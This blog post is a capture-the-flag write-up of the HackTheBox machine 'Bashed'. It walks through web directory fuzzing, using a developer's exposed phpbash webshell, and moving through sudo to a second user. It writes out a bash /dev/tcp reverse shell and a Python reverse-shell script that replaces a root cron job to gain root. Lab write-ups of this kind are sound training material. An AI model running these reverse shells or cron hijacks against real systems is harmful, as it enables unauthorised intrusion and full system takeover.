---
toc: true
comments: true
title: HackTheBox - Bashed
layout: post
title: HackTheBox - Bashed
date: 2024-06-06 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Linux, Web, phpbash, Sudo, Cron, PrivEsc]    
image: /assets/Posts/Bashed/logo.png
---

## Pre
- Bashed is a lovely, gentle Linux box whose whole personality is a joke: someone built an in-browser bash shell (`phpbash`), left it on a public web server, and… well, you can guess.
- It's the perfect box to introduce two of the most common Linux privesc primitives you'll see forever: **`sudo -l` lateral movement** and a **writable script run by a root cron job**.
- Coming off [Devel](/posts/hackthebox-devel/) this is a nice change of pace – no exploits to compile, just reading configuration and thinking like a lazy admin.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 80 -T4 -sSCV -A -oN nmap/versions $IP
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

A single web port. The page is a developer blog, and one post is literally titled *"phpbash"* describing a tool the author wrote – a semi-interactive PHP shell that runs in the browser. That's a giant hint to go find where it's deployed. Time to fuzz.

```shell
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
/images               (Status: 301)
/uploads              (Status: 301)
/php                  (Status: 301)
/css                  (Status: 301)
/dev                  (Status: 301)
/js                   (Status: 301)
```

`/dev` is not something you'd link publicly. Let's look inside it.

```shell
$ gobuster dir -u http://$IP/dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
/phpbash.php          (Status: 200)
/phpbash.min.php      (Status: 200)
```

There it is: `http://10.10.10.68/dev/phpbash.php`. The developer left their own webshell in the `/dev` folder.

## Phase 2: Foothold
Browsing to `phpbash.php` gives us a fake terminal running commands as `www-data` straight from the browser – no exploitation needed, it's a feature-turned-hole:

```shell
www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The in-browser shell is clunky, so let's upgrade to a real reverse shell. Set up a listener (`nc -lvnp 4444`) and run a bash reverse shell from phpbash:

```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'
```

Then stabilise it the usual way:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The user flag is readable from `/home/arrexel/user.txt`. Now let's escalate.

## Phase 3: sudo -l → scriptmanager
The very first thing on any Linux box: check what our user can run with sudo.

```shell
www-data@bashed:/$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This says `www-data` can run **anything** as the user `scriptmanager`, with **no password**. That's not root yet, but lateral movement is progress. We hop over:

```shell
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

## Phase 4: The cron job to root
Why does `scriptmanager` matter? Let's look around the filesystem for anything owned by that user in an unusual place.

```shell
scriptmanager@bashed:/$ ls -la /
drwxrwxr-x   2 scriptmanager scriptmanager  4096 ... scripts
```

A top-level `/scripts` directory owned by `scriptmanager`. Inside:

```shell
scriptmanager@bashed:/scripts$ ls -la
-rw-xr--r-- 1 scriptmanager scriptmanager   58 test.py
-rw-r--r-- 1 root          root            12 test.txt
```

Here's the tell: `test.py` is owned by us (`scriptmanager`), but `test.txt` – which `test.py` writes to – is owned by **root** and its timestamp keeps updating. That means **root is running `test.py` on a schedule** (a cron job). We can't see root's crontab, but the evidence is right there in the file ownership and the constantly-refreshing timestamp.

Since we own `test.py`, we overwrite it with a reverse shell (or a simpler `chmod +s /bin/bash`) and wait for root's cron to execute it for us:

```shell
scriptmanager@bashed:/scripts$ cat > test.py <<'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",4445))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
```

With a listener on `4445` waiting, within a minute root's scheduled task runs our script:

```shell
$ nc -lvnp 4445
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68]
root@bashed:/scripts# id
uid=0(root) gid=0(root) groups=0(root)
```

> Never blindly overwrite a script a cron job depends on if you don't understand what it does – on a live system you could break the very thing being automated. In a CTF it's fine; in an engagement, append your payload or restore the file afterwards.
{: .prompt-warning }

## Conclusions
- Bashed is a masterclass in "the vulnerability is a decision, not a bug": a developer's convenience tool (phpbash) becomes an unauthenticated shell.
- The escalation chain – `sudo -l` for lateral movement, then a writable-script cron job – is one of the most common patterns in real Linux environments. Get comfortable spotting the "root-owned output file with a fresh timestamp" tell.
- Automating this recon with tools like `linpeas.sh` or `pspy` (which watches for cron processes in real time) would surface both steps instantly.
- Next we chain a web logic flaw with a packet capture on [Cap](/posts/hackthebox-cap/).

_Keep hacking_  🙈🙉🙊
